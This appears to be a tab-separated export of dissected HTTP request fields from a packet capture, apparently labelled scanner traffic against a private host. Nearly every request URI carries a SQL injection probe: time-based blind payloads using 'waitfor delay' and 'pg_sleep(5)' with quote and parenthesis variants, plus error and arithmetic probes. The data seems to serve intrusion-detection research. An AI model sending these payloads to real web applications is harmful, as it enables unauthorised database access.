http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1120						1	http://192.168.1.104/'))%3bwaitfor%20delay%20'0%3a0%3a5'--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%3bwaitfor%20delay%20'0%3a0%3a5'--/
																											192.168.1.104									1121						1	http://192.168.1.104/pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/pg_sleep(5)--/
																											192.168.1.104									1123						1	http://192.168.1.104/))%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/))%3bwaitfor%20delay%20'0%3a0%3a5'--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1126						1	http://192.168.1.104/%22))%3bwaitfor%20delay%20'0%3a0%3a5'--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%3bwaitfor%20delay%20'0%3a0%3a5'--/
																											192.168.1.104									1129						1	http://192.168.1.104/1%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20or%20pg_sleep(5)--/
																											192.168.1.104									1131						1	http://192.168.1.104/'))%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%3bwaitfor%20delay%20'0%3a0%3a5'--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1133						1	http://192.168.1.104/pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/pg_sleep(5)--/
																											192.168.1.104									1134						1	http://192.168.1.104/%22%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20or%20pg_sleep(5)--/
																											192.168.1.104									1137						1	http://192.168.1.104/%22))%3bwaitfor%20delay%20'0%3a0%3a5'--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%3bwaitfor%20delay%20'0%3a0%3a5'--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1140						1	http://192.168.1.104/1%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20or%20pg_sleep(5)--/
																											192.168.1.104									1142						1	http://192.168.1.104/'%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20or%20pg_sleep(5)--/
																											192.168.1.104									1144						1	http://192.168.1.104/pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1147						1	http://192.168.1.104/%22%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20or%20pg_sleep(5)--/
																											192.168.1.104									1149						1	http://192.168.1.104/1)%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20or%20pg_sleep(5)--/
																											192.168.1.104									1151						1	http://192.168.1.104/1%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1154						1	http://192.168.1.104/'%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20or%20pg_sleep(5)--/
																											192.168.1.104									1155						1	http://192.168.1.104/%22)%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20or%20pg_sleep(5)--/
																											192.168.1.104									1159						1	http://192.168.1.104/%22%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1161						1	http://192.168.1.104/1)%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20or%20pg_sleep(5)--/
																											192.168.1.104									1163						1	http://192.168.1.104/')%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20or%20pg_sleep(5)--/
																											192.168.1.104									1166						1	http://192.168.1.104/'%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1168						1	http://192.168.1.104/%22)%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20or%20pg_sleep(5)--/
																											192.168.1.104									1169						1	http://192.168.1.104/1))%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20or%20pg_sleep(5)--/
																											192.168.1.104									1172						1	http://192.168.1.104/1)%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1175						1	http://192.168.1.104/')%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20or%20pg_sleep(5)--/
																											192.168.1.104									1177						1	http://192.168.1.104/%22))%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20or%20pg_sleep(5)--/
																											192.168.1.104									1180						1	http://192.168.1.104/%22)%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1182						1	http://192.168.1.104/1))%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20or%20pg_sleep(5)--/
																											192.168.1.104									1183						1	http://192.168.1.104/'))%20or%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20or%20pg_sleep(5)--/
																											192.168.1.104									1187						1	http://192.168.1.104/')%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1189						1	http://192.168.1.104/%22))%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20or%20pg_sleep(5)--/
																											192.168.1.104									1190						1	http://192.168.1.104/1%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20and%20pg_sleep(5)--/
																											192.168.1.104									1193						1	http://192.168.1.104/1))%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1195						1	http://192.168.1.104/'))%20or%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20or%20pg_sleep(5)--/
																											192.168.1.104									1198						1	http://192.168.1.104/%22%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20and%20pg_sleep(5)--/
																											192.168.1.104									1200						1	http://192.168.1.104/%22))%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1202						1	http://192.168.1.104/1%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20and%20pg_sleep(5)--/
																											192.168.1.104									1206						1	http://192.168.1.104/'%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20and%20pg_sleep(5)--/
																											192.168.1.104									1207						1	http://192.168.1.104/'))%20or%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20or%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1211						1	http://192.168.1.104/%22%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20and%20pg_sleep(5)--/
																											192.168.1.104									1212						1	http://192.168.1.104/1)%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20and%20pg_sleep(5)--/
																											192.168.1.104									1214						1	http://192.168.1.104/1%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1216						1	http://192.168.1.104/'%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20and%20pg_sleep(5)--/
																											192.168.1.104									1220						1	http://192.168.1.104/%22)%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20and%20pg_sleep(5)--/
																											192.168.1.104									1221						1	http://192.168.1.104/%22%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1223						1	http://192.168.1.104/1)%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20and%20pg_sleep(5)--/
																											192.168.1.104									1227						1	http://192.168.1.104/')%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20and%20pg_sleep(5)--/
																											192.168.1.104									1229						1	http://192.168.1.104/'%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1231						1	http://192.168.1.104/%22)%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20and%20pg_sleep(5)--/
																											192.168.1.104									1234						1	http://192.168.1.104/1))%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20and%20pg_sleep(5)--/
																											192.168.1.104									1235						1	http://192.168.1.104/1)%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1)%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1237						1	http://192.168.1.104/')%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20and%20pg_sleep(5)--/
																											192.168.1.104									1241						1	http://192.168.1.104/%22))%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20and%20pg_sleep(5)--/
																											192.168.1.104									1242						1	http://192.168.1.104/%22)%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22)%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1245						1	http://192.168.1.104/1))%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20and%20pg_sleep(5)--/
																											192.168.1.104									1247						1	http://192.168.1.104/'))%20and%20pg_sleep(5)--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20and%20pg_sleep(5)--/
																											192.168.1.104									1250						1	http://192.168.1.104/')%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/')%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1253						1	http://192.168.1.104/%22))%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20and%20pg_sleep(5)--/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1254						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.104									1256						1	http://192.168.1.104/1))%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1))%20and%20pg_sleep(5)--
																			16	16	application/x-www-form-urlencoded						192.168.1.104									1259						1	http://192.168.1.104/'))%20and%20pg_sleep(5)--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20and%20pg_sleep(5)--/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1263						1	http://192.168.1.104/123/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/123/
																											192.168.1.104									1269						1	http://192.168.1.104/%22))%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22))%20and%20pg_sleep(5)--
																			17	17	application/x-www-form-urlencoded						192.168.1.104									1273						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1275						1	http://192.168.1.104/'/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'/
																											192.168.1.104									1276						1	http://192.168.1.104/'))%20and%20pg_sleep(5)--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'))%20and%20pg_sleep(5)--
																			15	15	application/x-www-form-urlencoded						192.168.1.104									1281						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1288						1	http://192.168.1.104/%22/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1290						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			17	17	application/x-www-form-urlencoded						192.168.1.104									1293						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1301						1	http://192.168.1.104/%c2%bf'"(/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%c2%bf'"(/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1305						1	http://192.168.1.104/123/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/123/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									1312						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1319						1	http://192.168.1.104/(/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/(/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1322						1	http://192.168.1.104/'/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'/
																			15	15	application/x-www-form-urlencoded						192.168.1.104									1327						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1334						1	http://192.168.1.104/)/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/)/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1337						1	http://192.168.1.104/%22/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22/
																			15	15	application/x-www-form-urlencoded						192.168.1.104									1340						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1348						1	http://192.168.1.104/2%2b1/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/2%2b1/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1351						1	http://192.168.1.104/%c2%bf'"(/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%c2%bf'"(/
																			19	19	application/x-www-form-urlencoded						192.168.1.104									1353						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1362						1	http://192.168.1.104/1%2b2/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%2b2/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1366						1	http://192.168.1.104/(/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/(/
																			19	19	application/x-www-form-urlencoded						192.168.1.104									1368						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1376						1	http://192.168.1.104/3%2b5/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/3%2b5/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1379						1	http://192.168.1.104/)/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/)/
																			19	19	application/x-www-form-urlencoded						192.168.1.104									1381						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1390						1	http://192.168.1.104/2%2b6/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/2%2b6/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1393						1	http://192.168.1.104/2%2b1/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/2%2b1/
																			19	19	application/x-www-form-urlencoded						192.168.1.104									1396						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1404						1	http://192.168.1.104/3%2ba/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/3%2ba/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1407						1	http://192.168.1.104/1%2b2/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%2b2/
																			19	19	application/x-www-form-urlencoded						192.168.1.104									1410						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1418						1	http://192.168.1.104/3%2bb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/3%2bb/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1420						1	http://192.168.1.104/3%2b5/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/3%2b5/
																			19	19	application/x-www-form-urlencoded						192.168.1.104									1424						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1433						1	http://192.168.1.104/1-1/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1-1/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1435						1	http://192.168.1.104/2%2b6/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/2%2b6/
																			17	17	application/x-www-form-urlencoded						192.168.1.104									1437						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1446						1	http://192.168.1.104/2-2/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/2-2/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1450						1	http://192.168.1.104/3%2ba/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/3%2ba/
																			17	17	application/x-www-form-urlencoded						192.168.1.104									1453						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1460						1	http://192.168.1.104/11-5/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/11-5/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1463						1	http://192.168.1.104/3%2bb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/3%2bb/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									1466						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1474						1	http://192.168.1.104/12-6/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/12-6/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1477						1	http://192.168.1.104/1-1/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1-1/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									1481						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1488						1	http://192.168.1.104/0-a/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/0-a/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									1490						1	http://192.168.1.104/2-2/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/2-2/
																			17	17	application/x-www-form-urlencoded						192.168.1.104									1495						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									1502						1	http://192.168.1.104/0-b/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/0-b/
